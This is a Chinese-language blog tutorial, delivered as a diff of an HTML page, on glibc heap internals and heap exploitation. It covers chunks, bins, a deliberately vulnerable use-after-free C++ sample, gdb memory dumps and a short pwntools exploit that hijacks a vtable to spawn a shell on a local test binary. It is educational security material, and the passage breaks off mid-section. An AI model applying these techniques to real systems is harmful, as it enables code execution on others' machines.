@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Glibc Heap Exp-1Glibc Heap OverviewGLibc Heap 负责维护动态分配memory的结构称为Heap Libc里比较常用的部分是malloc，free，realloc C++的new，delete，底层是上述几个   配置新的内存块，释放掉并回收不需要的部分，在配置内存的时候尽量避免[碎片化]  Heap相关的漏洞利用 UAF Double free Heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Glibc Heap Exp">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;19&#x2F;glibcHeapExp&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="Glibc Heap Exp-1Glibc Heap OverviewGLibc Heap 负责维护动态分配memory的结构称为Heap Libc里比较常用的部分是malloc，free，realloc C++的new，delete，底层是上述几个   配置新的内存块，释放掉并回收不需要的部分，在配置内存的时候尽量避免[碎片化]  Heap相关的漏洞利用 UAF Double free Heap">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-19T14:06:52.934Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/19/glibcHeapExp/"/>
+
+
+
+
+
+  <title>Glibc Heap Exp | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/19/glibcHeapExp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Glibc Heap Exp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-19T22:06:03+08:00">
+                2020-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Glibc-Heap-Exp-1"><a href="#Glibc-Heap-Exp-1" class="headerlink" title="Glibc Heap Exp-1"></a>Glibc Heap Exp-1</h1><h2 id="Glibc-Heap-Overview"><a href="#Glibc-Heap-Overview" class="headerlink" title="Glibc Heap Overview"></a>Glibc Heap Overview</h2><h3 id="GLibc-Heap"><a href="#GLibc-Heap" class="headerlink" title="GLibc Heap"></a>GLibc Heap</h3><ul>
+<li>负责维护动态分配memory的结构称为Heap</li>
+<li>Libc里比较常用的部分是malloc，free，realloc<ul>
+<li>C++的new，delete，底层是上述几个</li>
+</ul>
+</li>
+<li>配置新的内存块，释放掉并回收不需要的部分，在配置内存的时候尽量避免[碎片化]</li>
+</ul>
+<h3 id="Heap相关的漏洞利用"><a href="#Heap相关的漏洞利用" class="headerlink" title="Heap相关的漏洞利用"></a>Heap相关的漏洞利用</h3><ul>
+<li>UAF</li>
+<li>Double free</li>
+<li>Heap overflow</li>
+</ul>
+<h3 id="Glibc-Heap相关概念"><a href="#Glibc-Heap相关概念" class="headerlink" title="Glibc Heap相关概念"></a>Glibc Heap相关概念</h3><ul>
+<li>glibc/malloc/malloc.c</li>
+<li>要做到内存的管理：<ul>
+<li>有哪些位置的内存可以分配</li>
+<li>有哪些位置因为free可以回收</li>
+<li>有哪些位置使用中则不需要记录，使用它们的人应该记住这些指标</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>整个Heap的信息记录在一个malloc_state的struct中，称为main_arena</li>
+<li>malloc分配的内存称为chunk，比要求的大小大一些，因为需要记录一些维护Heap用的额外信息</li>
+<li>Arena和heap分配的内存分开存放，heap overflow无法直接覆盖掉它的部分</li>
+<li>回收的chunk用linked list记录，称为bin</li>
+<li>main_arena中有很多的bin，每个bin储存的size不同，目的是让malloc时可以找到最适合大小的chunk</li>
+<li>回收的chunk会根据size来决定应该存放在哪个linked list（bin）中</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">    bin[0](size=16)-&gt;chunk1-&gt;chunk5</span><br><span class="line">    bin[1](size=32)-&gt;chunk2-&gt;chunk3-&gt;chunk4</span><br><span class="line">    bin[2](size=48)-&gt;chunk....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>malloc时，先从bin里面找可以使用的chunk，如果找不到才会真的分配新的内存给程序使用。分配时可以去找到足够大的chunk只切出需要的部分，剩下的部分会形成新的chunk</li>
+<li>找不到可以用的chunk时会从top chunk里分配，top chunk是一个很大的chunk，代表可使用但是未分配的内存，malloc分配时从里面切一块下来，剩下的重新设置为top</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">    mchunkptr top-&gt;top_chunk;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="编译glibc2-23时的一个问题"><a href="#编译glibc2-23时的一个问题" class="headerlink" title="编译glibc2.23时的一个问题"></a>编译glibc2.23时的一个问题</h3><blockquote>
+<p>regexec.c:3856:29: error: ‘extra’ may be used uninitialized in this function [-Werror=maybe-uninitialized]<br>    const unsigned char *coll_sym = extra + cset-&gt;coll_syms[i];</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用docker时的一个问题"><a href="#使用docker时的一个问题" class="headerlink" title="使用docker时的一个问题"></a>使用docker时的一个问题</h3><p>为了契合glibc2.19版本，使用docker创建了一个ubuntu14.04的容器，在修改地址随机化时提示权限不够，其实就是创建docker时需要特权进入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged=<span class="literal">true</span> ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h3><ul>
+<li>存放chunk metadata的chunk结构</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>;</span><br><span class="line">    malloc_chunk *fd;</span><br><span class="line">    malloc_chunk *bk;</span><br><span class="line">    malloc_chunk *fd_nextsize;</span><br><span class="line">    malloc_chunk *bk_nextsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>64bit:mem=malloc(size)<br>  -&gt; chunk=mem-16;<br>  chunksize=(size+8)#16 加8是为了给前一个chunk的data使用<ul>
+<li>实际的chunk位置是malloc得到的地址+16</li>
+<li>chunksize是size+8后向上对齐16得到的</li>
+</ul>
+</li>
+</ul>
+<h3 id="Chunk-Header标志位"><a href="#Chunk-Header标志位" class="headerlink" title="Chunk Header标志位"></a>Chunk Header标志位</h3><ul>
+<li>size:该chunk在内存中的大小，不是malloc size</li>
+<li>fd，bk：指向bin里的前一个后一个chunk<ul>
+<li>一般来说bin就是double linked list</li>
+</ul>
+</li>
+<li>prev_size:前一个chunk size，维护heap时可以得知前一个chunk位置</li>
+</ul>
+<h3 id="Size-64-bit"><a href="#Size-64-bit" class="headerlink" title="Size(64 bit)"></a>Size(64 bit)</h3><ul>
+<li>size标志位包含chunk size以及flag bits</li>
+<li>chunk size为把size标志位最低3 bit：<ul>
+<li>fast bin&lt;=128</li>
+<li>small bin&lt;2014</li>
+<li>large bin</li>
+<li>mmap&gt;=9x20000</li>
+</ul>
+</li>
+<li>最低的bit为prev inuse bit,用来表示前一个chunk是否使用<ul>
+<li>free会使下一个chunk的prev_inust bit被设置为0</li>
+</ul>
+</li>
+</ul>
+<h3 id="Heap操作"><a href="#Heap操作" class="headerlink" title="Heap操作"></a>Heap操作</h3><ul>
+<li><p>p=malloc(size)</p>
+<ul>
+<li>找出一个可用的chunk,或从top chunk切下一块来</li>
+<li>如果这个chunk是回收的，要先从bin里面unlink，即移除unlinked list</li>
+<li>填好结构，并回传chunk+16</li>
+</ul>
+</li>
+<li><p>free(p)</p>
+<ul>
+<li>检查该chunk内存地址的前后chunk，是不是not inuse</li>
+<li>如果有，则这些回收的内存可以合并</li>
+<li>合并后的新chunk放到对应的bin中</li>
+</ul>
+</li>
+</ul>
+<h4 id="free-的例子"><a href="#free-的例子" class="headerlink" title="free 的例子"></a>free 的例子</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Malloc</span><span class="params">(<span class="keyword">size_t</span> sz)</span></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(sz);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p = malloc(%ld)\n"</span>,p,sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">void</span> *p)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"free(%p)\n',p"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *p,*q,*r,*s;</span><br><span class="line">  p=<span class="built_in">malloc</span>(<span class="number">152</span>);</span><br><span class="line">  q=<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p,<span class="string">'A'</span>,<span class="number">152</span>);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>malloc完毕：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/36xg 0x0602000</span><br><span class="line">0x602000:       0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020a0:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x6020b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>meset完毕：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/36xg 0x602000 </span><br><span class="line">0x602000:       0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x602010:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602020:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602030:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602040:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602050:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602060:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602070:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602080:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602090:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x6020a0:       0x4141414141414141      0x0000000000000021</span><br><span class="line">0x6020b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>free完毕：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/36xg 0x602000 </span><br><span class="line">0x602000:       0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x602010:       0x00007ffff7dd4bb8      0x00007ffff7dd4bb8</span><br><span class="line">0x602020:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602030:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602040:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602050:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602060:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602070:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602080:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602090:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x6020a0:       0x00000000000000a0      0x0000000000000020</span><br><span class="line">0x6020b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit-UAF"><a href="#Exploit-UAF" class="headerlink" title="Exploit:UAF"></a>Exploit:UAF</h2><ul>
+<li>和chunk，bin等heap内部操作没有关系</li>
+<li>让程序的两耳光指标指向同一个内存<ul>
+<li>一个是structure，另一个用作data buffer</li>
+<li>利用对buffer的读写，修改或者泄露structure的内容</li>
+</ul>
+</li>
+</ul>
+<h3 id="利用chunk的回收特性"><a href="#利用chunk的回收特性" class="headerlink" title="利用chunk的回收特性"></a>利用chunk的回收特性</h3><ul>
+<li><p>所谓UAF，就是free（p）掉后还继续使用它</p>
+<ul>
+<li>例如：linked list remove掉后，忘了把它指向的内容置为NULL，导致内容还留存在list中</li>
+</ul>
+</li>
+<li><p>重新malloc（=q）一样的大小，会拿到曾经free掉的chunk，此时就存在两个指针p,q指向同一片内存，使用这两个指针的操作会混在一起</p>
+<ul>
+<li>如：其中一个是C++的对象，有个vtable指针用来找出实际的function，如果另一个是可以写入的data buffer，就可以改掉function pointer。</li>
+</ul>
+</li>
+</ul>
+<p>one sample:</p>
+<p>代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"class A"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A&#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"class B"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span></span>&#123;</span><br><span class="line">  system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  A *p=<span class="keyword">new</span> B();</span><br><span class="line">  <span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line">  fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">char</span>*q=strdup(buf);</span><br><span class="line"></span><br><span class="line">  p-&gt;<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行完</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">char</span>*q=strdup(buf);</span><br></pre></td></tr></table></figure>
+
+<p>gets内容为”AAAABBBB”后堆的内部变化：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20xg 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000020fe1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br><span class="line">gdb-peda$ lay src</span><br><span class="line">gdb-peda$ x/20xg 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x4242424241414141      0x000000000000000a</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000020fe1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh_addr=<span class="number">0x40090D</span></span><br><span class="line">buf=<span class="number">0x601160</span></span><br><span class="line"></span><br><span class="line">io.sendline((p64(buf+<span class="number">8</span>)+p64(sh_addr)).ljust(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>堆：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601160:0x601168 _Z2shv</span><br></pre></td></tr></table></figure>
+
+<p>此时将0x601168当作虚表指针，指向了system(“sh”)，然后再追一次调用system(“sh”)。</p>
+<h2 id="Fastbin-Corruption"><a href="#Fastbin-Corruption" class="headerlink" title="Fastbin Corruption"></a>Fastbin Corruption</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><ul>
+<li><p>chunk size&lt;=get_max_fast()的chunk，会被放在一系列称为fastbin的bin里</p>
+<ul>
+<li>64 bit是128 byte，32 bit是64 byt</li>
+<li>global_max_fast 一开始是0</li>
+</ul>
+</li>
+<li><p>Fastbin是single linked list，只使用fd，以NULL做结尾</p>
+</li>
+<li><p>Chunk size从32开始，共7个可以用的fastbin</p>
+</li>
+<li><p>free时不取消下一个chunk的inuse标志位，因为fastbin chunk不会和其它chunk合并</p>
+</li>
+<li><p>malloc，free操作时glibc会做一些检查，确认heap metadata是否正确，避免一些可能的攻击方式</p>
+</li>
+<li><p>为了效率，fastbin里的检查会比其他类型的bin少很多</p>
+</li>
+</ul>
+<h3 id="fastbin-corruption"><a href="#fastbin-corruption" class="headerlink" title="fastbin corruption"></a>fastbin corruption</h3><ul>
+<li>让fastbin linked list指向任意地址，之后malloc就是将该地址作为chunk拿出来</li>
+<li>freed(not inuse) chunk才会存在bin里，修改它的fd才会造成corruption<ul>
